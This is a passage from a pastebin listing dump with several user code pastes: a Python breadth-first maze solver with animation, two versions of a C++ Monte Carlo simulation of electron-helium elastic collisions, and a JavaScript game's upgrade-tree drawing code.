  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4bKWgDeM,Задача №2 Выход есть!,Korotkodul,Python,Friday 28th of March 2025 03:51:26 PM CDT,"import matplotlib.pyplot as plt
import numpy as np
from IPython.display import display, clear_output
from IPython.display import HTML
from matplotlib.animation import FuncAnimation
import time
from queue import Queue

def find_shortest_path(
    maze: np.ndarray, 
    start: tuple[int, int], 
    end: tuple[int, int]
):
  parent = np.full((maze.shape[0], maze.shape[1], 2), [-1, -1])
  parent[start[0]][start[1]] = start
  visited = np.zeros(maze.shape)
  visited[start[0]][start[1]] = 1
  level = np.full(maze.shape, -1)
  level[start[0]][start[1]] = -1
  queue = Queue()
  queue.put(start)
  while not queue.empty():
      node = queue.get()
      level[node[0]][node[1]] = level[parent[node[0]][node[1]][0]][parent[node[0]][node[1]][1]] + 1
      #print (""node: "", node)
      dx = [0, 1, 0, -1]
      dy = [-1,0, 1, 0]
      neighbors = []
      for i in range(4):
        x = node[0] + dx[i]
        y = node[1] + dy[i]
        if 0 <= x < maze.shape[0] and 0 <= y < maze.shape[1] and maze[x][y] and not visited[x][y]:
          neighbors.append(tuple((x, y)))
      for neighbor in neighbors:
          if not visited[neighbor[0]][neighbor[1]]:
              visited[neighbor[0]][neighbor[1]] = 1
              queue.put(neighbor)
              parent[neighbor[0]][neighbor[1]] = [node[0], node[1]]
  """"""print(""visited"")
  print(visited)
  #print(""parent"")
  #print(parent)""""""
  if end != start and level[end[0]][end[1]] == -1:
    return False, False
  path = [np.array([end[0], end[1]])]
  nd = end
  while not (nd[0] == start[0] and nd[1] == start[1]):
    nd = parent[nd[0]][nd[1]]
    path.append(nd)
  return path, level


def visualize_grid(size_x, size_y, coordinates, grid_data, level):
    fig, ax = plt.subplots(figsize=(size_y, size_x))  # Изменение порядка, size_x — строки, size_y — столбцы

    # Настройка осей
    ax.set_xticks(np.arange(size_y))  # Координаты по оси X (по столбцам)
    ax.set_yticks(np.arange(size_x))  # Координаты по оси Y (по строкам)
    ax.set_xticklabels(np.arange(size_y))  # Подписи для оси X
    ax.set_yticklabels(np.arange(size_x))  # Подписи для оси Y

    # Жирные линии для сетки между клетками (толщина линии увеличена)
    ax.set_xticks(np.arange(size_y + 1) - 0.5, minor=True)  # Для рисования сетки
    ax.set_yticks(np.arange(size_x + 1) - 0.5, minor=True)  # Для рисования сетки
    ax.grid(which=""minor"", color=""black"", linestyle='-', linewidth=6)  # Жирная сетка (толщина линии увеличена в 3 раза)

    # Отображаем сетку по краям (границы)
    ax.spines['top'].set_linewidth(6)  # Верхняя граница (толщина линии увеличена)
    ax.spines['right'].set_linewidth(6)  # Правая граница (толщина линии увеличена)
    ax.spines['bottom'].set_linewidth(6)  # Нижняя граница (толщина линии увеличена)
    ax.spines['left'].set_linewidth(6)  # Левая граница (толщина линии увеличена)

    # Убираем подписи с осей, потому что они уже на координатах
    ax.tick_params(which=""both"", bottom=False, left=False, labelbottom=False, labelleft=False)

    plt.xlim(-0.5, size_y - 0.5)
    plt.ylim(size_x - 0.5, -0.5)  # Инвертируем ось Y, чтобы (0, 0) была в верхнем левом углу
    ax.set_aspect('equal')

    # Отображаем клетки в зависимости от значений в grid_data
    for i in range(size_x):  # Идем сверху вниз по оси X (строки)
        for j in range(size_y):  # И слева направо по оси Y (столбцы)
            color = 'blue' if grid_data[i, j] == 1 else 'white'
            ax.add_patch(plt.Rectangle((j - 0.5, i - 0.5), 1, 1, color=color))  # Заполняем клетки

    # Раскрашиваем клетки в розовый цвет, если они находятся в списке координат
    for x, y in coordinates:
        ax.add_patch(plt.Rectangle((y - 0.5, x - 0.5), 1, 1, color='pink'))  # Розовые клетки (x по Y, y по X)

    # Добавление координат для оси X снизу (сдвигаем выше)
    for i in range(size_y):
        ax.text(i, -0.8, str(i), ha='center', va='center', fontsize=12)  # Подписи снизу

    # Добавление координат для оси Y слева (сдвигаем влево)
    for j in range(size_x):
        ax.text(-0.8, j, str(j), ha='center', va='center', fontsize=12)  # Подписи слева

    # Список для хранения текстовых объектов
    text_objects = []

    # Функция обновления для анимации
    def update(frame):
        nonlocal text_objects
        # Очищаем старые текстовые объекты только после того, как отрисованы все цифры
        if frame == len(np.unique(level)) - 1:
            for text in text_objects:
                text.remove()
            text_objects.clear()  # Очищаем список после удаления старых цифр

        # Выбираем цифры, которые будут отрисовываться
        unique_values = np.unique(level)  # Получаем уникальные значения в level
        unique_values = unique_values[unique_values != -1]  # Убираем -1, чтобы не отображать его

        # Перемещаемся по уровням и рисуем соответствующие цифры
        value = unique_values[frame % len(unique_values)]  # Выбираем очередное значение для отображения
        for i in range(size_x):
            for j in range(size_y):
                if level[i, j] == value:
                    text = ax.text(j, i, str(value), ha='center', va='center', fontsize=12, color='red', fontweight='bold')
                    text_objects.append(text)  # Сохраняем объект текста

        # Возвращаем список текстовых объектов
        return text_objects

    # Создаём анимацию
    anim = FuncAnimation(fig, update, frames=len(np.unique(level)) - 1, interval=1000, repeat=True)
    # Сохраняем анимацию в файл
    return anim

def animate_wave_algorithm(
    maze: np.ndarray, 
    start: tuple[int, int], 
    end: tuple[int, int], 
    save_path: str = """"
): #  -> FuncAnimation:
    path, level = find_shortest_path(maze, start, end)
    if not path:
      print(""NO PATH FROM START TO END"")
      exit(0)
    anim = visualize_grid(maze.shape[0], maze.shape[1], path, maze, level)
    return anim


maze = np.array([
    [0, 0, 0, 0, 0, 0, 0, 0],
    [0, 1, 1, 1, 1, 1, 0, 0],
    [1, 1, 0, 1, 0, 1, 0, 0],
    [1, 1, 1, 1, 1, 1, 0, 0],
    [0, 1, 0, 0, 0, 1, 1, 1],
    [1, 1, 1, 1, 1, 1, 0, 0],
    [0, 0, 0, 0, 0, 1, 1, 1],
])





start = (2, 0)
end = (6, 7)

way = find_shortest_path(maze, start, end)


save_path = ""labyrinth.gif""  # Укажите путь для сохранения анимации
animate_wave_algorithm(maze, start, end, """")

animation = animate_wave_algorithm(maze, start, end, save_path)
HTML(animation.to_jshtml())"
sA52dvHK,e-n collisions(v3),phystota,C++,Friday 28th of March 2025 03:41:27 PM CDT,"#include <iostream>
#include <random>
#include <fstream>

#include <math.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#define n_e 50000
#define V_0 30000.0     // max velocity using to generate random distribution ---- doesn't work -> produces skew distribution???
#define Emin 0.0
#define Emax 100.0
#define bin_width 0.01
#define m_e 9.1E-31 // electron mass in kg
#define k_b 1.38E-23 // Boltzmann constant
#define q 1.602176634E-19 // elementary charge    - eV -> J transfer param
#define N ( (int)((Emax-Emin)/bin_width) ) // add 1 to include E_max if needed?
#define P 0.6 // elastic collision constant probability
#define P_null 0.4 // null-collision
#define steps 500
#define T_n 10.0 // Helium neutral temperature in eV
#define M_n 6.6464731E-29 // Helium atom mass
#define N_He 1000000 // Helium neutrals number

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided = false;

    //initialization function // void func(Type0& t) → means the function expects a reference to variable t of type0
    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis) {
        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 
        
        energy = Emax*dis(gen);
        
        double speed = sqrt(2*energy*q/m_e);

        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
};


struct CrossSection {
    double energy;
    double sigma;
};

double interpolate (double energy, const std::vector<CrossSection>& elastic_CS) {


    if (energy < elastic_CS.front().energy) {
        std::cout << "" required energy value lower than range of cross-section data"" << ""\n"";
        return 0.0;
    }
    if (energy > elastic_CS.back().energy) {
        std::cout << "" required energy value higher than range of cross-section data"" << ""\n"";
        return 0.0;        
    }

    int step = 0;   
        while (step < elastic_CS.size() && energy > elastic_CS[step].energy) {
            step++;
        }

    double k = (elastic_CS[step].sigma - elastic_CS[step-1].sigma)/(elastic_CS[step].energy - elastic_CS[step-1].energy);
    double m = elastic_CS[step].sigma - k*elastic_CS[step].energy;
    
    return k*energy + m; 
}


struct NeutralParticle {

    double energy = 0.0;
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;

    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/M_n);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
    
};




int main() {

    clock_t start = clock();

    std::vector<Electron> electrons(n_e); // better to use vector instead of simple array as it's dynamically allocated (beneficial for ionization)
//    std::vector<double> neutrals(N_He); // vector for neutrals
    std::vector<NeutralParticle> neutrals(N_He); 


    std::vector<int> histo_random(N, 0); // initialize N size zero-vector for random (initial) histogram
    std::vector<int> histo_maxwell(N, 0); // initialize N size zero-vector for maxwellian histogram
    std::vector<int> histo_neutral(N, 0); // initialize N size zero-vector for neutral distribution histogram

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);
    std::gamma_distribution<double> maxwell(1.5, T_n);

    std::uniform_int_distribution<int> pair(0, n_e-1);


    std::ifstream elastic_cs(""cross_sections/elastic.dat"");
    if (!elastic_cs.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }    

    // reading elastic cross section datafile

    std::vector<CrossSection> elastic_CS;

    double energy, sigma;

    while (elastic_cs >> energy >> sigma) {
        elastic_CS.push_back({energy, sigma});
    }    

    elastic_cs.close();


    std::ofstream file0(""velocities.dat"");    
    if (!file0.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file1(""energies.dat"");    
    if (!file1.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    
    std::ofstream file2(""energies_final.dat"");    
    if (!file2.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file3(""histo_random.dat"");    
    if (!file3.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""histo_maxwell.dat"");    
    if (!file4.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    file4 << std::fixed << std::setprecision(10);           
    
    std::ofstream file5(""neutral_distribution.dat"");    
    if (!file5.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file6(""E*f(E).dat"");    
    if (!file6.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }



    // Initialize all electrons
    for (auto& e : electrons) {
        e.initialize(gen, dis);
    }
    // initialize all nenutrals
    for (auto&n : neutrals) {
        n.initialize(gen, dis, maxwell);
    }


    for (int i = 0; i < n_e; i++){
        file1 << i << "" "" << electrons.at(i).energy << ""\n"";
        file0 << i << "" "" << electrons[i].vx << "" "" << electrons[i].vy << "" "" << electrons[i].vz << ""\n""; 
    }


    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_random.size())
            histo_random[bin]++;
    }

    for (int i = 0; i < histo_random.size(); i++){\
        double bin_start = Emin + i*bin_width;
        file3 << i*bin_width << "" "" <<  static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n""; // dividing by n_e to get normalized distribution
    }


    for (int i = 0; i < N_He; i++){
        int bin = (int)( (neutrals[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_neutral.size())
            histo_neutral[bin]++;
    }    

    for (int i = 0; i < histo_neutral.size(); i++){
        double bin_start = Emin + i*bin_width;
        file5 << i*bin_width << "" "" << static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this is real f(E) - normalized distribution
        file6 << i*bin_width << "" "" << (i*bin_width)*static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this should be E*f(E) 

    }   

    int Ne_collided = (1.0-P_null)*n_e; // introducing null-collision technique

    for (int t = 0; t < steps; t++){

        // setting flags to false each timestep
        for (int i = 0; i < n_e; i++){
            electrons[i].collided = false;
        }

        int collision_counter = 0;

        while (collision_counter < Ne_collided) {

            int i = pair(gen);

            if (dis(gen) < P && !electrons[i].collided) {

                // ----   Collision energy redistribution module

                // electron particle X Y Z initial velocities and energy
                double V0_x_1 = electrons[i].vx;
                double V0_y_1 = electrons[i].vy;
                double V0_z_1 = electrons[i].vz;

                // neutral particle X Y Z initial velocities

                int k = pair(gen);

                double V0_x_2 = neutrals[k].vx;
                double V0_y_2 = neutrals[k].vy;
                double V0_z_2 = neutrals[k].vz;

                // initial relative velocity X Y Z (must be equal to final relative velocity in center-of-mass frame) 

                double V0_rel_x = (V0_x_1 - V0_x_2);
                double V0_rel_y = (V0_y_1 - V0_y_2);
                double V0_rel_z = (V0_z_1 - V0_z_2);

                double V0_rel = sqrt(V0_rel_x*V0_rel_x + V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);

                // center-of-mass frame initial velocity (magnitude of it must be equal to the counterpart in this frame)

                double V_cm_x = (m_e*V0_x_1 + M_n*V0_x_2)/(m_e + M_n);
                double V_cm_y = (m_e*V0_y_1 + M_n*V0_y_2)/(m_e + M_n);
                double V_cm_z = (m_e*V0_z_1 + M_n*V0_z_2)/(m_e + M_n);                    

                // generating random variables to calculate random direction of center-of-mass after the collision

                double R1 = dis(gen);
                double R2 = dis(gen);

                // calculating spherical angles for center-of-mass random direction
                double theta = acos(1.0- 2.0*R1);
                double phi = 2*M_PI*R2;

                //calculating final relative velocity with random direction

                double V_rel_x = V0_rel*sin(theta)*cos(phi);
                double V_rel_y = V0_rel*sin(theta)*sin(phi);
                double V_rel_z = V0_rel*cos(theta);

                double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);

                //calculating final velocity of electron

                double V_x_1 = V_cm_x + V_rel_x * (M_n/(m_e + M_n));
                double V_y_1 = V_cm_y + V_rel_y * (M_n/(m_e + M_n));
                double V_z_1 = V_cm_z + V_rel_z * (M_n/(m_e + M_n));

                double V_1 = sqrt(V_x_1*V_x_1 + V_y_1*V_y_1 + V_z_1*V_z_1);

                //updating electron energy and velocities

                electrons[i].energy = m_e*V_1*V_1/(2.0*q);
                electrons[i].vx = V_x_1;
                electrons[i].vy = V_y_1;
                electrons[i].vz = V_z_1;

                collision_counter += 1;

                electrons[i]. collided = true;
            }                      
        }
    }

    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";

        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    for (int i = 0; i < histo_maxwell.size(); i++){
        double bin_start = Emin + i*bin_width;
        file4 << i*bin_width << "" "" <<  (i*bin_width)*static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width) << ""\n""; // getting f(E)*E
    }


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();
    file5.close();
    file6.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    std::cout << ""Energies written successfuly\n"";
    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";


    return 0;

}"
kPvyVfQE,tree?,AJPlayz7,JavaScript,Friday 28th of March 2025 03:37:17 PM CDT,"let tiles,
    branches,
    tankTree,


function generateTankTree(indexes) {
    tiles = [];
    branches = [];
    tankTree = { width: 0, height: 0 };
    let rightmostSoFar = 0;
    if (!Array.isArray(indexes)) indexes = [indexes];
    for (let index of indexes) {
        rightmostSoFar += 3 + measureSize(rightmostSoFar, 0, 0, { index }).width;
    }
    for (let { x, y } of tiles) {
        tankTree.width = Math.max(tankTree.width, x);
        tankTree.height = Math.max(tankTree.height, y);
    }
} // (...drawFloor)


global.showTree = false;
global.scrollX = global.scrollY = global.fixedScrollX = global.fixedScrollY = -1;
global.scrollVelocityY = global.scrollVelocityX = 0;
let lastGuiType = null;
function drawUpgradeTree(spacing, alcoveSize) {
    /*if (global.died) {
        global.showTree = false;
        global.scrollX = global.scrollY = global.fixedScrollX = global.fixedScrollY = global.scrollVelocityY = global.scrollVelocityX = 0;
        global.treeScale = 1;
        return;
    }*/ // Hide the tree on death

    if (lastGuiType != gui.type) {
        let m = util.getEntityImageFromMockup(gui.type), // The mockup that corresponds to the player's tank
            rootName = m.rerootUpgradeTree, // The upgrade tree root of the player's tank
            rootIndex = [];
        for (let name of rootName) {
            let ind = name == undefined ? -1 : global.mockups.find(i => i.className == name).index;
            rootIndex.push(ind); // The index of the mockup that corresponds to the root tank (-1 for no root)
        }
        if (!rootIndex.includes(-1)) {
            generateTankTree(rootIndex);
        }
        lastGuiType = gui.type;
    }

    if (!tankTree) {
        console.log('No tank tree rendered yet.');
        return;
    }

    let tileSize = alcoveSize / 2,
        size = tileSize - 4, // TODO: figure out where this 4 comes from
        spaceBetween = 10,
        screenDivisor = (spaceBetween + tileSize) * 2 * global.treeScale,
        padding = tileSize / screenDivisor,
        dividedWidth = global.screenWidth / screenDivisor,
        dividedHeight = global.screenHeight / screenDivisor,
        treeFactor = 1 + spaceBetween / tileSize;

    global.fixedScrollX = Math.max(
        dividedWidth - padding,
        Math.min(
            tankTree.width * treeFactor + padding - dividedWidth,
            global.fixedScrollX + global.scrollVelocityX
        )
    );
    global.fixedScrollY = Math.max(
        dividedHeight - padding,
        Math.min(
            tankTree.height * treeFactor + padding - dividedHeight,
            global.fixedScrollY + global.scrollVelocityY
        )
    );
    global.scrollX = util.lerp(global.scrollX, global.fixedScrollX, 0.1);
    global.scrollY = util.lerp(global.scrollY, global.fixedScrollY, 0.1);

    for (let [start, end] of branches) {
        let sx = ((start.x - global.scrollX) * (tileSize + spaceBetween) + 1 + 0.5 * size) * global.treeScale + global.screenWidth / 2,
            sy = ((start.y - global.scrollY) * (tileSize + spaceBetween) + 1 + 0.5 * size) * global.treeScale + global.screenHeight / 2,
            ex = ((end.x - global.scrollX) * (tileSize + spaceBetween) + 1 + 0.5 * size) * global.treeScale + global.screenWidth / 2,
            ey = ((end.y - global.scrollY) * (tileSize + spaceBetween) + 1 + 0.5 * size) * global.treeScale + global.screenHeight / 2;
        if (ex < 0 || sx > global.screenWidth || ey < 0 || sy > global.screenHeight) continue;
        ctx.strokeStyle = color.black;
        ctx.lineWidth = 2 * global.treeScale;
        drawGuiLine(sx, sy, ex, ey);
    }
    ctx.globalAlpha = 0.5;
    ctx.fillStyle = color.guiwhite;
    ctx.fillRect(0, 0, innerWidth, innerHeight);
    ctx.globalAlpha = 1;

    //draw the various tank icons
    let angle = -Math.PI / 4;
    for (let { x, y, colorIndex, index } of tiles) {
        let ax = (x - global.scrollX) * (tileSize + spaceBetween) * global.treeScale + global.screenWidth / 2,
            ay = (y - global.scrollY) * (tileSize + spaceBetween) * global.treeScale + global.screenHeight / 2;
        if (ax < -tileSize || ax > global.screenWidth + tileSize || ay < -tileSize || ay > global.screenHeight + tileSize) continue;
        drawEntityIcon(index.toString(), ax, ay, tileSize * global.treeScale, tileSize * global.treeScale, global.treeScale, angle, 1, colorIndex);
    }

    let text = ""Arrow keys to navigate the class tree. Shift to navigate faster. Scroll wheel (or +/- keys) to zoom in/out."";
    let w = measureText(text, 18);
    ctx.globalAlpha = 1;
    ctx.lineWidth = 1;
    ctx.fillStyle = color.dgrey;
    ctx.strokeStyle = color.black;
    ctx.fillText(text, global.screenWidth / 2 - w / 2, innerHeight * 0.04);
    ctx.strokeText(text, global.screenWidth / 2 - w / 2, innerHeight * 0.04);
} // (...drawMessages)


    global.canSkill = !!gui.points && !global.showTree;
    global.fps = global.metrics.rendertime;
    if (global.showTree) {
        drawUpgradeTree(spacing, alcoveSize);
    } else {
        if (global.mobile) { // MOBILE UI
            drawMobileJoysticks();
            drawMobileButtons(spacing, alcoveSize);
        } // (mobile ui)"
uKYxJFLf,CF1538D,pb_jiang,C++,Friday 28th of March 2025 03:19:47 PM CDT,
TH2EQd3n,e-n collisions(v2),phystota,C++,Friday 28th of March 2025 02:25:29 PM CDT,"#include <iostream>
#include <random>
#include <fstream>

#include <math.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#define n_e 100000
#define V_0 30000.0     // max velocity using to generate random distribution ---- doesn't work -> produces skew distribution???
#define Emin 0.0
#define Emax 100.0
#define bin_width 0.01
#define m_e 9.1E-31 // electron mass in kg
#define k_b 1.38E-23 // Boltzmann constant
#define q 1.602176634E-19 // elementary charge    - eV -> J transfer param
#define N ( (int)((Emax-Emin)/bin_width) ) // add 1 to include E_max if needed?
#define P 0.6 // elastic collision constant probability
#define P_null 0.4 // null-collision
#define steps 400
#define T_n 10.0 // Helium neutral temperature in eV
#define M_n 6.6464731E-29 // Helium atom mass
#define N_He 10000000 // Helium neutrals number

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided = false;

    //initialization function // void func(Type0& t) → means the function expects a reference to variable t of type0
    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis) {
        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 
        
        energy = Emax*dis(gen);
        
        double speed = sqrt(2*energy*q/m_e);

        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
};


struct CrossSection {
    double energy;
    double sigma;
};

double interpolate (double energy, const std::vector<CrossSection>& elastic_CS) {


    if (energy < elastic_CS.front().energy) {
        std::cout << "" required energy value lower than range of cross-section data"" << ""\n"";
        return 0.0;
    }
    if (energy > elastic_CS.back().energy) {
        std::cout << "" required energy value higher than range of cross-section data"" << ""\n"";
        return 0.0;        
    }

    int step = 0;   
        while (step < elastic_CS.size() && energy > elastic_CS[step].energy) {
            step++;
        }

    double k = (elastic_CS[step].sigma - elastic_CS[step-1].sigma)/(elastic_CS[step].energy - elastic_CS[step-1].energy);
    double m = elastic_CS[step].sigma - k*elastic_CS[step].energy;
    
    return k*energy + m; 
}


struct NeutralParticle {

    double energy = 0.0;
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;

    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/M_n);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
    
};




int main() {

    clock_t start = clock();

    std::vector<Electron> electrons(n_e); // better to use vector instead of simple array as it's dynamically allocated (beneficial for ionization)
//    std::vector<double> neutrals(N_He); // vector for neutrals
    std::vector<NeutralParticle> neutrals(N_He); 


    std::vector<int> histo_random(N, 0); // initialize N size zero-vector for random (initial) histogram
    std::vector<int> histo_maxwell(N, 0); // initialize N size zero-vector for maxwellian histogram
    std::vector<int> histo_neutral(N, 0); // initialize N size zero-vector for neutral distribution histogram

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);
    std::gamma_distribution<double> maxwell(1.5, T_n);

    std::uniform_int_distribution<int> pair(0, N_He-1);


    std::ifstream elastic_cs(""cross_sections/elastic.dat"");
    if (!elastic_cs.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }    

    // reading elastic cross section datafile

    std::vector<CrossSection> elastic_CS;

    double energy, sigma;

    while (elastic_cs >> energy >> sigma) {
        elastic_CS.push_back({energy, sigma});
    }    

    elastic_cs.close();


    std::ofstream file0(""velocities.dat"");    
    if (!file0.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file1(""energies.dat"");    
    if (!file1.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    
    std::ofstream file2(""energies_final.dat"");    
    if (!file2.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file3(""histo_random.dat"");    
    if (!file3.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""histo_maxwell.dat"");    
    if (!file4.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    file4 << std::fixed << std::setprecision(10);           
    
    std::ofstream file5(""neutral_distribution.dat"");    
    if (!file5.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file6(""E*f(E).dat"");    
    if (!file6.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }



    // Initialize all electrons
    for (auto& e : electrons) {
        e.initialize(gen, dis);
    }
    // initialize all nenutrals
    for (auto&n : neutrals) {
        n.initialize(gen, dis, maxwell);
    }


    for (int i = 0; i < n_e; i++){
        file1 << i << "" "" << electrons.at(i).energy << ""\n"";
        file0 << i << "" "" << electrons[i].vx << "" "" << electrons[i].vy << "" "" << electrons[i].vz << ""\n""; 
    }


    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_random.size())
            histo_random[bin]++;
    }

    for (int i = 0; i < histo_random.size(); i++){\
        double bin_start = Emin + i*bin_width;
        file3 << i*bin_width << "" "" <<  static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n""; // dividing by n_e to get normalized distribution
    }


    for (int i = 0; i < N_He; i++){
        int bin = (int)( (neutrals[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_neutral.size())
            histo_neutral[bin]++;
    }    

    for (int i = 0; i < histo_neutral.size(); i++){
        double bin_start = Emin + i*bin_width;
        file5 << i*bin_width << "" "" << static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this is real f(E) - normalized distribution
        file6 << i*bin_width << "" "" << (i*bin_width)*static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this should be E*f(E) 

    }   

    for (int t = 0; t < steps; t++){

        // setting flags to false each timestep
        
        for (int j = 0; j < n_e; j++){
            electrons[j].collided = false;
        }

        for (int i = 0; i < n_e; i++) {            
            if (dis(gen) < P && !electrons[i].collided) {

                // ----   Collision energy redistribution module

                // electron particle X Y Z initial velocities and energy
                double V0_x_1 = electrons[i].vx;
                double V0_y_1 = electrons[i].vy;
                double V0_z_1 = electrons[i].vz;

                // neutral particle X Y Z initial velocities

                int k = pair(gen);

                double V0_x_2 = neutrals[k].vx;
                double V0_y_2 = neutrals[k].vy;
                double V0_z_2 = neutrals[k].vz;

                // initial relative velocity X Y Z (must be equal to final relative velocity in center-of-mass frame) 

                double V0_rel_x = (V0_x_1 - V0_x_2);
                double V0_rel_y = (V0_y_1 - V0_y_2);
                double V0_rel_z = (V0_z_1 - V0_z_2);

                double V0_rel = sqrt(V0_rel_x*V0_rel_x + V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);

                // center-of-mass frame initial velocity (magnitude of it must be equal to the counterpart in this frame)

                double V_cm_x = (m_e*V0_x_1 + M_n*V0_x_2)/(m_e + M_n);
                double V_cm_y = (m_e*V0_y_1 + M_n*V0_y_2)/(m_e + M_n);
                double V_cm_z = (m_e*V0_z_1 + M_n*V0_z_2)/(m_e + M_n);                    

                // generating random variables to calculate random direction of center-of-mass after the collision

                double R1 = dis(gen);
                double R2 = dis(gen);

                // calculating spherical angles for center-of-mass random direction
                double theta = acos(1.0- 2.0*R1);
                double phi = 2*M_PI*R2;

                //calculating final relative velocity with random direction

                double V_rel_x = V0_rel*sin(theta)*cos(phi);
                double V_rel_y = V0_rel*sin(theta)*sin(phi);
                double V_rel_z = V0_rel*cos(theta);

                double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);

                //calculating final velocity of electron

                double V_x_1 = V_cm_x + V_rel_x * (M_n/(m_e + M_n));
                double V_y_1 = V_cm_y + V_rel_y * (M_n/(m_e + M_n));
                double V_z_1 = V_cm_z + V_rel_z * (M_n/(m_e + M_n));

                double V_1 = sqrt(V_x_1*V_x_1 + V_y_1*V_y_1 + V_z_1*V_z_1);

                //updating electron energy and velocities

                electrons[i].energy = m_e*V_1*V_1/(2.0*q);
                electrons[i].vx = V_x_1;
                electrons[i].vy = V_y_1;
                electrons[i].vz = V_z_1;

                // updating the collisional flag
                electrons[i].collided = true;
            }         
        }
    }

    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";

        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    for (int i = 0; i < histo_maxwell.size(); i++){
        double bin_start = Emin + i*bin_width;
        file4 << i*bin_width << "" "" <<  (i*bin_width)*static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width) << ""\n""; // getting f(E)*E
    }
